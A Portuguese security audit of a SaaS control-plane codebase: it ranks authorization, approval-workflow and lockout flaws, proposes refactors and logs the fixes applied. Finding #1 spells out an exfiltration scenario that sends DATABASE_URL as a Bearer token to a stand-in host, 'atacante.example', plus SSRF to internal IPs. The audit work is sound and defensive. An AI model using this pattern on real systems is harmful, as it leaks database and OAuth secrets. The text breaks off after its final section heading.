# Auditoria crítica: Central SaaS (plano de controle do HUB)

Repositório: `/home/user/saas_000_central` (commit `5807503`, histórico aprofundado para 48 commits). Nenhum arquivo do repositório foi alterado. Não executei a app, as migrations nem chamadas a serviços reais.

Contexto respeitado (não re-litigado): ADR 0001 (bootstrap independente, export Base44 preservado), `docs/DECISIONS.md` e `docs/ARCHITECTURE.md`. O próprio ARCHITECTURE declara que o RBAC/ABAC definitivo, o isolamento completo e a auditoria de login/sessão ainda são pendências (C1). Por isso, não reporto "falta RBAC granular" nem "login não é auditado" como achados. Reporto só os bugs concretos no que **já existe**.

---

## 1. Resumo em 5 linhas

1. O backend é pequeno e bem cuidado: sessão opaca com hash, cookie HttpOnly, argon2, correlation ID, erros sem vazamento, toda query filtrada por `tenant_id` da sessão. Não há SQL cru com f-string e não achei IDOR clássico por troca de ID.
2. **Risco nº 1 (Crítico):** o "probe" de integração lê **qualquer variável de ambiente** cujo nome o admin escolhe (`credential_ref`) e a envia como `Bearer` para uma `base_url` também escolhida pelo admin. Com isso dá para exfiltrar `DATABASE_URL`, `GOOGLE_CLIENT_SECRET` ou `BOOTSTRAP_ADMIN_PASSWORD`.
3. **Risco nº 2 (Alto):** suspender um administrador (ou organização) não revoga as sessões, e quase todas as rotas GET não checam membership ativa. O suspenso continua lendo gestores, configurações, usuários de produto, integrações etc.
4. **Risco nº 3 (Alto):** o fluxo de aprovação humana é autodeclarado. A lista de ações "sensíveis" do backend (7 termos) diverge da lista da UI (18 termos). O próprio solicitante aprova a própria operação, e `approval_status` de configuração vem do cliente.
5. Também: brute force no login (lockout com corrida e sem limite por IP, que ainda permite DoS da conta do superadmin), criação de administrador sem auditoria, audit log "append-only" só no nome, e vocabulário de papéis divergente entre backend e frontend.

---

## Mapa de rotas (Passo 0 / Passo 1: authn/authz)

Stack: FastAPI 0.141.1 + Starlette 1.6, SQLAlchemy 2.0.54 (sync, psycopg 3), Alembic (0001→0012), sessão opaca em `auth_sessions` + cookie `central_session`, Google OAuth opcional, React 18 + Vite (sem lazy routes). Não há webhooks, jobs, cron, Import Engine nem executor remoto no backend. `execute_operation` lança `NotImplementedError` (`backend/app/services/connectors/mediamind.py:134-138`).

Pontos quentes (git log, código): `backend/app/models/__init__.py` (13), `api/v1/router.py` (11), `frontend/src/lib/routes.render.test.jsx` (10), `alembic/env.py` (10), `frontend/src/pages/UsersAccess.jsx` (9), `SaasDetail.jsx` (7), `api/v1/access.py` (5).

| Rota | Login | Papel / checagem | Membership ativa? | Audita? |
|---|---|---|---|---|
| `GET /`, `/health`, `/version`, `/ready` | não | público (ok) | n/a | n/a |
| `POST /api/v1/auth/login` | não | público (ok). Lockout só por conta | n/a | não (pendência documentada) |
| `POST /auth/logout` | cookie opcional | n/a | n/a | não |
| `GET /auth/google/start`, `/google/callback` | não | state em cookie + `compare_digest` | n/a | não |
| `GET /auth/session` | sim | só sessão | não | n/a |
| `GET /access/managers`, `/permissions`, `/profiles`, `/organization-units`, `/assignments`, `/users/{id}/effective-access` | sim | **nenhuma** | **não** | n/a |
| `POST /access/managers` | sim | superadmin | sim (via `role_for`) | **NÃO** |
| `PATCH /access/managers/{id}`, `POST permissions/profiles/organization-units`, `PUT users/{id}/assignment` | sim | superadmin | sim | sim |
| `GET /audit` | sim | superadmin/admin/delegated_admin | sim | n/a |
| `GET /home/summary` | sim | qualquer | **sim** (é a única GET que checa) | n/a |
| `GET /saas`, `/saas/{id}`, `/manifests`, `/manifests/{id}`, `/product-users`, `/configurations`, `/operations`, `/integrations/connections`, `/integrations/observations`, `/control-resources` | sim | **nenhuma** | **não** | n/a |
| `POST/PATCH /saas`, `PUT /manifests/{id}`, `POST /product-users`, `POST /configurations`, `POST /operations`, `PATCH /operations/{id}/status`, `POST /integrations/connections`, `POST .../probe` | sim | `{"superadmin","admin"}` | sim | sim |
| `POST/PATCH /control-resources` | sim | superadmin | sim | sim |

Toda rota de `/api/v1` (fora de `/auth`) usa `Depends(get_current_session)`. Não há rota de negócio anônima.

---

## 2. Tabela de achados (ordenada por severidade)

| # | Severidade | Área | Onde | Problema | Cenário concreto de falha | Correção sugerida | Esforço |
|---|---|---|---|---|---|---|---|
| 1 | **Crítico** | Segurança / S2S / SSRF | `backend/app/api/v1/integrations.py:228` `token = os.getenv(connection.credential_ref)`; `backend/app/schemas/integration.py:11-12` `base_url: str = Field(pattern=r"^https?://"...)` / `credential_ref: str = Field(pattern=r"^[A-Z][A-Z0-9_]{2,199}$")`; `backend/app/services/connectors/mediamind.py:91,98-100` | O nome da variável de ambiente e a URL de destino vêm do body. O probe lê o env do processo da Central e manda o valor em `Authorization: Bearer ...` para essa URL (inclusive `http://`). A resposta remota (JSON) e `str(exc)` voltam como `evidence` (`mediamind.py:117,122`). | Um superadmin/admin de qualquer organização faz `POST /integrations/connections` com `credential_ref="DATABASE_URL"` e `base_url="https://atacante.example"`, depois `POST .../probe`. O atacante recebe a string de conexão do Neon e vira dono do banco: promove-se, apaga auditoria, lê todas as organizações. O mesmo vale para `GOOGLE_CLIENT_SECRET` e `BOOTSTRAP_ADMIN_PASSWORD`. Também serve de SSRF para endereços internos (`http://10.x/...`), lendo o JSON de `/api/v1/admin/health` e `/manifest`. | Não usar env livre. Guardar referências num cofre/tabela própria (ex.: allowlist com prefixo obrigatório `HUB_CONN_<SLUG>_TOKEN`, validada no servidor) e amarrar cada segredo a um host permitido (allowlist de domínios por produto). Exigir `https://` fora de `local`, bloquear IPs privados/link-local e limitar o tamanho de `evidence`. | M |
| 2 | **Alto** | IAM / lifecycle | `backend/app/api/v1/access.py:140` `membership.is_active = changes["status"] == "active"` (sem revogar sessões); `backend/app/tenancy/context.py:34-37` (só checa `user.is_active`); GETs sem checagem, ex. `access.py:67-78`, `configurations.py:129-138`, `product_users.py:309-318`, `integrations.py:65-82`; contraste: `home.py:216-229` checa | Suspender uma membership não encerra as sessões existentes, e 15 das 17 rotas GET não verificam membership ativa (só `/audit` e `/home/summary` verificam). `can_write_saas`/`role_for` também ignoram `Tenant.is_active`. | Um gestor é suspenso por suspeita de abuso. Pelas 8 h seguintes (`session_hours`), ele continua listando e-mails de todos os gestores, usuários de produto (PII), valores de configuração, conexões e operações. Se a organização inteira for desativada (`Tenant.is_active=False`), quem já estava logado mantém até a **escrita** até a sessão expirar. Nenhum teste cobre "suspenso perde acesso" (`backend/tests/test_access_api.py:85-104` só confere o status). | Criar uma dependência única `require_member(roles=...)` que resolve tenant, membership ativa e tenant ativo em toda rota. Na suspensão, revogar `auth_sessions` do usuário naquele tenant (ou todas) na mesma transação. Adicionar um teste de regressão. | P/M |
| 3 | **Alto** | Workflow de aprovação / regra duplicada | `backend/app/api/v1/operations.py:15` `SENSITIVE_ACTIONS = ("delete", "remove", "suspend", "reset", "rotate", "revoke", "close")` vs `frontend/src/lib/adminHelpers.js:98-103` (18 termos: `drop`, `purge`, `disable`, `grant`, `elevate`, `block`, `migrate`, `provision`, `decommission`...) | O backend decide `awaiting_confirmation` vs `queued` por substring numa lista menor que a da UI. A UI exibe "sensível / exige aprovação" (`OperationCenter.jsx:94`, `NewOperationDialog.jsx:12`) para ações que o servidor já enfileirou. Também não reconhece termos em português (`excluir`, `desativar`, `bloquear`). | O operador cria "disable tenant X" ou "grant admin". A tela mostra o aviso de aprovação, mas a operação nasce `queued`, sem decisão humana. Isso contradiz `docs/DECISIONS.md` ("correção estrutural, banco, auth, permissão ou produção exige aprovação"). Hoje nada executa a fila, mas o primeiro worker herdará o furo. | Trocar texto livre por um catálogo de ações vindo do manifest (`action_code` + flag `requires_approval` no servidor). A UI deve ler a classificação devolvida pela API, nunca recalcular. | M |
| 4 | **Alto** | Workflow de aprovação / segregação de funções | `backend/app/api/v1/operations.py:71-94` (nenhuma checagem `item.requested_by`/criador ≠ `current.user`); `backend/app/schemas/configuration.py:51` `approval_status: str = Field(default="auto", pattern=r"^(auto\|pending\|approved\|rejected)$")` + `configurations.py:169-173` | O mesmo admin que cria uma operação sensível pode aprová-la no segundo seguinte. Em configurações, o próprio cliente envia `approval_status="approved"`. | Um admin mal-intencionado (ou com sessão roubada) cria "delete product-tenant X" e aprova sozinho. A trilha de auditoria registra "aprovação", dando aparência de controle de quatro olhos que não existiu. | Exigir aprovador ≠ solicitante (guardar `requested_by_user_id` real) e definir um papel aprovador. `approval_status` deve ser só do servidor: criação sempre `pending` quando a política exigir. | P |
| 5 | **Alto** | Auth / abuso | `backend/app/services/auth.py:69-74` `user.failed_login_attempts += 1 ... session.commit()`; nenhum rate limiter no projeto (grep por `slowapi\|limiter\|redis\|upstash` vazio) | (a) Incremento read-modify-write no ORM, sem `SELECT ... FOR UPDATE` nem `UPDATE ... SET x = x + 1`: N tentativas paralelas gravam o mesmo valor, e o lockout de 5 vira 5 × paralelismo. (b) Sem limite por IP: qualquer um bloqueia a conta do superadmin enviando 5 senhas erradas a cada 15 min. | Um atacante conhece o e-mail do superadmin (é o `BOOTSTRAP_ADMIN_EMAIL`) e mantém a conta travada indefinidamente, deixando o plano de controle sem administrador. Ou dispara rajadas paralelas para multiplicar tentativas de senha. | Usar `UPDATE users SET failed_login_attempts = failed_login_attempts + 1 ... RETURNING` atômico. Adicionar rate limit por IP + e-mail no Upstash (já está no alvo de deploy) e usar backoff progressivo em vez de lockout duro, ou um lockout que não se aplica ao primeiro fator alternativo (Google). | M |
| 6 | **Alto** | Auditoria (bypass) | `backend/app/api/v1/access.py:81-104` (`create_manager`: `session.add(user)` → `session.commit()` sem `append_audit`) | Criar um **administrador com senha** é a ação mais sensível do IAM e é a única mutação de `/access` sem trilha. `update_manager`, `permission.create` etc. auditam. | Um superadmin cria um superadmin "fantasma" e depois o usa. Na Auditoria não aparece quem o criou nem quando. O checklist (`docs/CENTRAL_MASTER_IMPLEMENTATION_CHECKLIST.md:164`) exige auditar "mudanças de acesso". | Adicionar `append_audit(action="manager.create", after_data={email, role})` na mesma transação, mais um teste. A médio prazo, auditoria por decorator/serviço para não depender de lembrar (ver Arquitetura #1). | P |
| 7 | **Médio** | IAM / papéis divergentes | `backend/app/api/v1/saas.py:56` `return role in {"superadmin", "admin"}`; `backend/app/schemas/access.py:9` `pattern=r"^(superadmin\|delegated_admin\|operator\|viewer)$"`; `backend/app/api/v1/audit.py:178`; `frontend/src/lib/permissions.js:11-13,20` | O papel `admin` que o backend aceita para escrita **não pode ser atribuído** pela API. `delegated_admin` e `operator` nunca escrevem nada no backend, mas a UI os habilita para criar config/operação/product-user. O frontend ainda mapeia `admin`→superadmin. Papéis são strings soltas em 6+ lugares. | Um delegated_admin vê o botão "Nova operação", preenche e recebe 403. O suporte "resolve" promovendo-o a superadmin: escalada por conveniência. Uma futura migração que crie `admin` dá escrita de catálogo/integração (incluindo o achado #1) a um papel que a UI trata como superadmin. | Definir um `Role` enum + matriz papel→capacidade no backend, exposta em `/auth/session`. A UI consome essa matriz em vez de `ROLE_CAPABILITIES`. | M |
| 8 | **Médio** | IAM / lockout administrativo | `backend/app/api/v1/access.py:130-140` | Só a auto-**suspensão** é bloqueada. O superadmin pode rebaixar a si mesmo (`role="viewer"`), rebaixar ou suspender todos os outros superadmins, e não há guarda de "último superadmin". | Por erro de clique, a organização fica sem nenhum superadmin. Só se recupera com SQL direto no banco de produção, sem auditoria. | Antes de alterar role/status, contar superadmins ativos do tenant (com `FOR UPDATE`) e recusar se o resultado ficar 0. Bloquear também o auto-rebaixamento. | P |
| 9 | **Médio** | Isolamento entre organizações | `backend/app/api/v1/access.py:128-129` `user.full_name = changes["full_name"].strip()`; `access.py:91-92` 409 `USER_EMAIL_EXISTS` | `User` é global (multi-org), mas o superadmin do tenant A edita o `full_name` global de alguém que também é membro do tenant B. Além disso, `create_manager` revela se um e-mail existe em **qualquer** organização e impede vincular um usuário já existente. | O superadmin de A renomeia um usuário compartilhado e o nome muda na Auditoria e na UI de B. Também dá para enumerar quem é cliente/gestor em outras organizações. | Editar só atributos da membership no escopo do tenant. Para e-mail existente, criar um convite de membership em vez de 409. | M |
| 10 | **Médio** | Integridade da auditoria | `alembic/versions/0004_audit_logs.py:1,17-21` (`"append-only"`, `ForeignKey("tenants.id", ondelete="CASCADE")`); nenhum trigger/REVOKE no repo | "Append-only" é só convenção: a role da app tem UPDATE/DELETE, e apagar um tenant apaga sua trilha em cascata. | Combinado com o #1 (credencial do banco), um invasor apaga os rastros. Mesmo sem ataque, excluir uma organização elimina a evidência exigida por LGPD/forense. | Usar trigger `BEFORE UPDATE OR DELETE` que lança erro, `ondelete="RESTRICT"` (ou soft-delete de tenant) e role de app sem `UPDATE/DELETE` em `audit_logs`. Avaliar hash encadeado mais adiante. | P/M |
| 11 | **Médio** | Atribuição forjável | `backend/app/api/v1/operations.py:44` `requested_by=body.requested_by or current.user.email`; `backend/app/api/v1/configurations.py:172` `author=body.author or current.user.email` | "Solicitante" e "autor" são texto livre do cliente e aparecem na UI como verdade. | Um admin cria uma operação sensível com `requested_by="ceo@empresa"`, e o aprovador decide com base num solicitante falso. O audit guarda o ator real, mas a tela de operações não o mostra. | Ignorar esses campos do body. Gravar `requested_by_user_id` e o e-mail da sessão. | P |
| 12 | **Médio** | Confiabilidade / pool | `backend/app/api/v1/integrations.py:213-244` (SELECT abre a transação, depois faz 2 GETs HTTP de até 5 s cada, depois commit); `backend/app/db/session.py:18-21` `pool_size 5, max_overflow 5, pool_timeout 3` | Uma conexão do pool fica presa ("idle in transaction") durante as chamadas externas. | Com um produto remoto lento, cerca de 10 probes simultâneos esgotam o pool, e login e todas as rotas passam a falhar com timeout de 3 s (500). | Ler os dados, fazer `session.commit()`/fechar antes do HTTP e reabrir para persistir. Ou mover o probe para job assíncrono. | P |
| 13 | **Médio** | Banco / crescimento | `backend/app/api/v1/integrations.py:163-173` (sem `limit`/paginação) | `GET /integrations/observations` devolve **todo** o histórico de observações do tenant, cada uma com `evidence` JSON (que inclui o manifest remoto inteiro). A tela carrega isso a cada `load()` (`Integrations.jsx:18,23`). | Um probe por minuto gera cerca de 500 mil linhas por ano, e a tela de Integrações passa a baixar MBs e travar o banco a 3 s de `statement_timeout`. | Paginar por cursor (`observed_at, id`), devolver por padrão só a última observação por ambiente e aplicar retenção. | P |
| 14 | **Médio** | Dados sensíveis / LGPD | `backend/app/api/v1/configurations.py:129-138` (GET sem papel) e `:177-186` (`"value": config.value` no audit); `backend/app/api/v1/product_users.py:344-352` (e-mail/nome no `after_data`) | Valores de configuração (até 10 kB, sem flag "secreto") são lidos por qualquer membro, inclusive `viewer`, e copiados para a trilha imutável. E-mails/nomes de usuários de produto vão para o audit. | Alguém salva uma API key como configuração "setting". Ela fica visível a viewers e eternizada no audit log, sem como apagar quando houver pedido de exclusão (LGPD). | Adicionar o tipo `secret` (armazenar só a referência, mascarar na leitura e no audit). No audit, registrar PII por hash/ID em vez de valor. | M |
| 15 | **Médio** | Multi-org / sessão | `backend/app/services/auth.py:41` `selected_tenant_id=memberships[0][0].tenant_id`; `backend/app/repositories/identity.py:20` `.order_by(Membership.id)` (UUID4 aleatório) | O tenant da sessão é o da membership com menor UUID, uma escolha arbitrária, e não existe endpoint de troca de tenant. | Um usuário com acesso a 2 organizações sempre cai na "errada" e não consegue administrar a outra. Pior, pode agir (criar operação ou config) achando que está na organização certa. | Criar `POST /auth/session/tenant` validando membership ativa, e mostrar o tenant atual no cabeçalho. | M |
| 16 | **Baixo** | CSRF | `backend/app/api/v1/auth.py:54` `samesite="none" if settings.session_cookie_secure else "lax"`; rotas POST sem body: `/auth/logout`, `/integrations/connections/{id}/probe` | Em produção o cookie é `SameSite=None` (necessário para Vercel→Render) e não há token CSRF. As rotas JSON estão protegidas porque FastAPI 0.141 tem `strict_content_type=True` por padrão (conferido no wheel). Rotas **sem body** continuam alcançáveis por `<form method=post>`. `pyproject.toml` aceita `fastapi>=0.115`, então instalar sem o lock pode trazer uma versão sem essa proteção. | Um site malicioso força logout ou dispara probes (e, portanto, o envio do token do #1) de um admin logado. | Usar header obrigatório (`X-Requested-With`/`X-CSRF`) ou checagem de `Origin` em métodos não-GET, e fixar o piso do FastAPI no pyproject. | P |
| 17 | **Baixo** | Robustez | `backend/app/api/v1/access.py:42-43` (`raise ValueError(...)`), idem `saas.py:43-44`, `audit.py:165-166` | `selected_tenant_id` é `SET NULL` quando o tenant é apagado, e as rotas respondem 500 em vez de 401/403. | Depois de remover um tenant, os usuários logados veem "erro interno" em todas as telas, poluindo o monitoramento. | Tratar na dependência única (#2) com 403 `TENANT_NOT_SELECTED`. | P |
| 18 | **Baixo** | Frontend / bundle | `frontend/src/lib/routes.js:1-18` (todas as 30 páginas importadas estaticamente); `recharts` em `components/incidents/*Charts.jsx`, `framer-motion` em `pages/ApiGuides.jsx` | Não há `React.lazy`. Login carrega recharts, framer-motion e todas as telas administrativas. `package.json` ainda declara `three`, `jspdf`, `html2canvas`, `react-leaflet`, `@stripe/*` sem uso (superfície de supply chain). | O primeiro acesso à tela de login baixa o bundle inteiro do painel. | Usar `lazy()` por rota em `ADMIN_ROUTES` e remover dependências mortas. | P |
| 19 | **Baixo** | Frontend / cascata | `frontend/src/pages/SaasDetail.jsx:35-37` | `getSaas(id)` é aguardado antes de manifest, product-users e configurations, que só dependem de `id`. Apenas `listOperations(s?.name)` depende do produto, e por **nome** (frágil a renomear). | Detalhe do SaaS com o dobro da latência. Renomear o produto "perde" as operações. | Disparar as 4 chamadas em paralelo e filtrar operações por `saas_product_id`. | P |
| 20 | **Baixo** | Defaults | `backend/app/services/bootstrap.py:18-23` (sem tamanho mínimo de senha; `ManagerCreate` exige 12); `backend/app/core/config.py:17-20` (`environment` default `"local"`, `database_url` default com `local_dev_only`) | O bootstrap aceita uma senha de 1 caractere para o superadmin. Se `ENVIRONMENT` não for definido no Render, as validações de produção (cookie Secure, HTTPS) são puladas silenciosamente. | Deploy com env incompleta sobe sem `Secure` e sem erro explícito. | Validar senha ≥ 12 no bootstrap. Exigir `ENVIRONMENT` explícito (sem default) e falhar se `DATABASE_URL` não vier do ambiente fora de `local/test`. | P |

---

## 3. Arquitetura: até 3 candidatos de refatoração

### A. Contexto de autorização único (dependência `TenantContext`) — **Forte**
- **Arquivos:** `backend/app/tenancy/context.py`, `api/v1/access.py:40-54` (`tenant_id`, `role_for`), `api/v1/saas.py:41-56` (`selected_tenant`, `can_write_saas`), `api/v1/audit.py:163-178` (`can_read_audit`), `api/v1/home.py:215-229`, `api/v1/control.py:289` (importa helpers de outro router), `integrations.py`/`operations.py`/`configurations.py`/`manifests.py`/`product_users.py` (importam `can_write_saas` de `saas.py`).
- **Problema:** a regra "quem pode o quê neste tenant" está espalhada em 4 implementações diferentes e é reimportada entre routers. Cada rota escolhe se checa membership ativa e cada mutação lembra (ou esquece) de auditar. Os achados #2, #6, #7, #8 e #17 vêm todos daí. É um módulo raso: a "interface" é copiar o padrão.
- **Solução:** criar `require(capability)` como dependência FastAPI que devolve `TenantContext(user, tenant, membership, role)`. Ela valida sessão, tenant selecionado, tenant ativo e membership ativa, e consulta uma matriz `Role → capabilities` (enum). Mutações passam por um `AuditedUnitOfWork`/decorator que exige `audit(...)` antes do commit.
- **Ganho:** a mudança de política (ex.: delegated_admin pode criar config) acontece num arquivo só, e os testes de autorização viram uma tabela parametrizada sobre a matriz. A UI pode receber a mesma matriz via `/auth/session`, eliminando `frontend/src/lib/permissions.js`.

### B. Política de comandos administrativos no servidor — **Forte**
- **Arquivos:** `backend/app/api/v1/operations.py`, `backend/app/api/v1/configurations.py`, `frontend/src/lib/adminHelpers.js:98-108`, `frontend/src/components/operations/NewOperationDialog.jsx`, `frontend/src/pages/OperationCenter.jsx`.
- **Problema:** a regra "esta ação exige aprovação" está duplicada e divergente (#3), aceita texto livre, o aprovador pode ser o solicitante (#4) e o solicitante pode ser forjado (#11). A lógica vive no route handler, impossível de testar sem HTTP.
- **Solução:** criar `services/commands.py` com `request_command(ctx, action_code, ...)` e `decide(ctx, op_id, decision)`. `action_code` vem do manifest do produto, a política (`requires_approval`, papel aprovador, quatro olhos) é dado e não substring, e a resposta já traz `requires_approval` para a UI exibir.
- **Ganho:** um teste unitário cobre a política inteira, e o futuro worker que chamar `execute_operation` só consome operações `approved` por outra pessoa.

### C. `access.py` (489 linhas, o maior arquivo e ponto quente) → serviço de acesso efetivo — **Vale explorar**
- **Arquivos:** `backend/app/api/v1/access.py:338-489`, `frontend/src/pages/UsersAccess.jsx` (9 mudanças).
- **Problema:** o cálculo de acesso efetivo (perfil + allow/deny + caminho organizacional) está no router e não é usado em nenhum lugar para **decidir** acesso. `role_for` ignora completamente perfis e permissões. O usuário vê "permissões efetivas" que não têm efeito.
- **Solução:** extrair `services/effective_access.py` (função pura sobre dados carregados) e, quando o RBAC da C1 chegar, fazer o `require(capability)` de A consultá-lo.
- **Ganho:** uma fonte de verdade para "explicar" e para "aplicar" acesso, testável sem banco.

---

## 4. Plano de ataque

**Esta semana**
1. #1: restringir `credential_ref` (prefixo obrigatório + allowlist) e `base_url` (https + allowlist de host, bloquear IP privado). Até lá, desabilitar `POST .../probe` em produção.
2. #6: auditar `create_manager`.
3. #2: dependência que exige membership ativa nas GETs + revogação de sessões na suspensão, com teste de regressão.
4. #4 e #11: aprovador ≠ solicitante, `approval_status`/`requested_by`/`author` controlados pelo servidor.

**Este mês**
5. #5: incremento atômico do contador + rate limit por IP/e-mail no Upstash.
6. #3 + refatoração B: catálogo de ações com política no servidor, UI lendo a classificação.
7. #7 + refatoração A: enum de papéis e matriz única, UI consumindo `/auth/session`.
8. #8 (último superadmin), #10 (trigger append-only + `RESTRICT`), #12 (não segurar conexão no probe), #13 (paginar observações).

**Depois**
9. #14 (configurações secretas e PII no audit), #15 (troca de tenant), #9 (convite em vez de edição global), #16–#20 (higiene), refatoração C junto com o RBAC da C1.

---

## 5. Achados descartados (refutados na verificação)

- **CSRF em rotas JSON:** refutado. FastAPI 0.141.1 tem `strict_content_type=True` por padrão (conferido em `fastapi/applications.py` do wheel), então body sem `Content-Type: application/json` não é parseado. Ficou só o resíduo do #16.
- **CORS `*` com credenciais:** refutado. `allow_origins=[settings.frontend_url]` (`main.py:32`), e produção exige https.
- **Cookie sem flags:** refutado. `httponly=True`, `secure` obrigatório em production por validator (`config.py:39-41`, com teste em `test_production_config.py`).
- **IDOR por troca de ID** em saas/manifests/connections/operations/control-resources/assignments: refutado. Todas as queries filtram `tenant_id` da sessão, e joins de integração filtram tenant nas 3 tabelas.
- **Escalada IAM por admin comum:** refutado. Todas as escritas de `/access` exigem `superadmin` ativo no tenant, e `profile_id`/`organization_unit_id`/`manager_user_id`/`parent_id` são validados no mesmo tenant.
- **Enumeração/timing no login:** refutado. `DUMMY_PASSWORD_HASH` (`services/auth.py:11,61`) e mensagem única.
- **SQL injection:** refutado. Único `text()` é `SELECT 1` (`db/session.py:38`). `ilike` da auditoria usa bind parameter (`%`/`_` só alargam a busca no próprio tenant).
- **Token de sessão previsível ou em claro no banco:** refutado. `secrets.token_urlsafe(32)` + SHA-256 armazenado.
- **OAuth state/CSRF do Google:** refutado. State em cookie + `compare_digest` (`auth.py:150`), e `email_verified` é checado.
- **Chamada externa sem timeout:** refutado. Google `timeout=15`, conector `timeout=5.0`, banco `connect_timeout=3` + `statement_timeout=3000`.
- **PII/segredos em logs de aplicação:** refutado. O logger JSON só emite campos allowlisted (`observability/logging.py:13-22`).
- **Datas sem fuso:** refutado. Todos os `DateTime(timezone=True)` e `aware_utc` na leitura.
- **Migrations perigosas:** refutado. 0001–0012 só criam tabelas/índices novos, com downgrade.
- **FKs sem índice:** refutado nas colunas consultadas (todas `index=True`). Só `auth_sessions.selected_tenant_id` não tem índice, sem consulta por ele hoje.
- **Transação parcial no bootstrap:** refutado. Dois commits, mas reexecutar re-seeda via `already_configured` (`bootstrap.py:36-38`).
- **Login sem auditoria:** pendência já documentada (`ARCHITECTURE.md` e checklist linha 164). Não re-litigado.
- **Open redirect no `returnTo`:** refutado. `frontend/src/lib/authReturnTo.js:11-29` trata `//` e `\`.
- **Segredos em `VITE_*`:** refutado. Só `VITE_API_URL` e IDs públicos do Base44 (legado documentado).

---

## 6. Perguntas de negócio

1. **Organizações (tenants) além da "central" serão administradas por clientes externos?** Recomendação: assumir que sim e tratar o superadmin de tenant como **não confiável para a infraestrutura**. Isso torna o #1 bloqueante antes de qualquer segundo tenant.
2. **`viewer`/`operator` devem ler e-mails de gestores, valores de configuração e usuários de produto?** Recomendação: não. Viewer vê catálogo e saúde; PII e configurações exigem `delegated_admin+`.
3. **Qual o papel aprovador de operações e configurações sensíveis, e quatro olhos é obrigatório?** Recomendação: quatro olhos obrigatório para ações de lifecycle (suspender, apagar, conceder acesso), com aprovador `superadmin` diferente do solicitante.
4. **`delegated_admin` deve escrever catálogo/integrações/configurações (como a UI sugere) ou não (como o backend faz)?** Recomendação: pode criar config/operação/product-user, nunca conexão de integração (segredos).
5. **Suspender um gestor deve derrubar a sessão imediatamente?** Recomendação: sim, revogar todas as sessões no tenant na mesma transação.
6. **Configurações podem guardar segredos?** Recomendação: não no campo `value`. Criar o tipo `secret` com referência a cofre e mascarar sempre.
7. **Retenção da auditoria e exclusão de tenant:** a trilha deve sobreviver à exclusão da organização? Recomendação: sim, com prazo legal definido (ex.: 5 anos), tenant com soft-delete e PII pseudonimizada no audit.
8. **Política anti-brute-force:** é aceitável que 5 erros travem a conta do superadmin por 15 min? Recomendação: não. Rate limit por IP + backoff, MFA obrigatório para superadmin e lockout que não impeça o login via Google.

---

## 7. Correções aplicadas em 2026-10-23

Branch `qualidade/kit-revisao-2026-10-23`, commits locais (sem push nem deploy). Rotina: teste que falha, correção, teste que passa, um item por commit.

| Achado | Commit | Testes que cobrem |
|---|---|---|
| #1 Crítico (probe exfiltra env / SSRF) + #12 (conexão presa no probe) | `d91b357` | `backend/tests/test_integration_outbound_policy.py` (denylist e namespace `*_HUB_ADMIN_TOKEN`, https, IPs privado/loopback/link-local/CGNAT/IPv6 após DNS, host vinculado, sem redirect, evidência ≤ 16 kB, conexão legada falha fechada sem ler o env, conexão do pool liberada antes do HTTP) |
| #2 Suspensão não corta acesso + #17 (500 sem tenant) + refatoração A (parcial) | `67ab4a0` | `backend/tests/test_tenant_access.py` (15 GETs × membership inativa, 15 GETs × tenant inativo, escrita com tenant inativo, `TENANT_NOT_SELECTED`, sessões revogadas na suspensão, teste estrutural: toda rota fora de `/auth` usa `get_tenant_context`) |
| #4 Autoaprovação e `approval_status` do cliente | `96d0043` (migration `0013_operation_requester`) | `backend/tests/test_operations_api.py` |
| #3 Lista de ações sensíveis divergente + refatoração B (parcial) | `0dca8ed` | `backend/tests/test_operation_policy.py` (união revisada, paridade com o fallback JS, `GET /operations/policy`), `frontend/src/lib/adminHelpers.test.js` |
| #5 Lockout com corrida e DoS do superadmin | `5f2fb09` (migration `0014_login_throttles`) | `backend/tests/test_login_throttle.py`, `backend/tests/test_auth_service.py` (teste antigo ajustado à nova política) |
| #6 `create_manager` sem auditoria | `6e00846` | `test_creating_administrator_is_audited_without_password` |
| #13 Observações sem limite | `b866e58` | `test_observations_are_bounded_and_paginated` |
| #11 `requested_by`/`author` forjáveis | `f70c559` | `test_operation_requester_comes_from_session`, `test_configuration_author_comes_from_session` |
| #8 Último superadmin | `90f1da4` | `test_last_active_superadmin_cannot_be_demoted`, `test_superadmin_can_be_demoted_or_suspended_while_another_remains` |
| #19 Cascata no Detalhe do SaaS | `7b1f831` | `frontend/src/pages/SaasDetail.test.jsx` |
| #18 Sem code splitting | `fc69df1` | `frontend/src/lib/routes.test.js` + testes de renderização de todas as rotas |

Resultados medidos:

- Backend: 79 → 179 testes passando (`pytest backend/tests`). `ruff check backend` limpo. Formatação: os 31 arquivos Python tocados estão formatados; resta 1 arquivo antigo não tocado (`backend/app/schemas/control.py`), eram 4 no início.
- Frontend: vitest 110 → 117 passando, `npm run lint` limpo, `npm run typecheck` sem erros, `npm run build` ok.
- Migrations 0013 e 0014: `upgrade head` → `downgrade -1` → `upgrade head` e `alembic check` ("No new upgrade operations detected") em PostgreSQL 16 local, com banco descartável.
- Throttling no PostgreSQL: 40 falhas concorrentes (16 threads) resultaram em contador exatamente 40. O par bloqueado não impede o login de outro endereço e libera após expirar.
- Bundle (com `VITE_API_URL` definida; sem ela o `httpClient` lança no topo do módulo e o bundler descarta o app inteiro, o que torna inválida qualquer medição feita sem a variável): JS inicial 1.199.639 B (347.055 B gzip) → 525.748 B (170.422 B gzip). O total sobe para 1.210.870 B (371.029 B gzip) em 34 chunks.

### Decisões de implementação

- `credential_ref` precisa terminar em `_HUB_ADMIN_TOKEN` (compatível com `MEDIAMIND_HUB_ADMIN_TOKEN` e com o padrão da tela, `SAAS_HUB_ADMIN_TOKEN`), além de passar por uma denylist explícita dos segredos centrais. Fora de `local`/`test`, o probe também exige https, um IP público após DNS e o host vinculado à credencial na nova variável **opcional** `INTEGRATION_CREDENTIAL_HOSTS` (JSON `{"MEDIAMIND_HUB_ADMIN_TOKEN": ["host"]}`). Sem ela, o boot funciona normalmente, mas a criação de conexão e o probe em produção respondem `INTEGRATION_TARGET_NOT_ALLOWED`. É o comportamento seguro por padrão.
- Login: o throttling é feito por par conta + endereço, com backoff de 15/30/60 min… até 24 h. A conta inteira só é bloqueada após `LOGIN_MAX_ATTEMPTS × 10` falhas, e esse contador recomeça a cada bloqueio. O login pelo Google não passa por esse bloqueio.
- Os conjuntos de papéis (`superadmin/admin` escrevem, `+delegated_admin` lê a auditoria) **não mudaram**. Só passaram a ser lidos do contexto único.
- `approval_status` de configuração é sempre `"auto"` no servidor, porque ainda não existe fluxo de aprovação de configuração.

### O que não foi feito e por quê

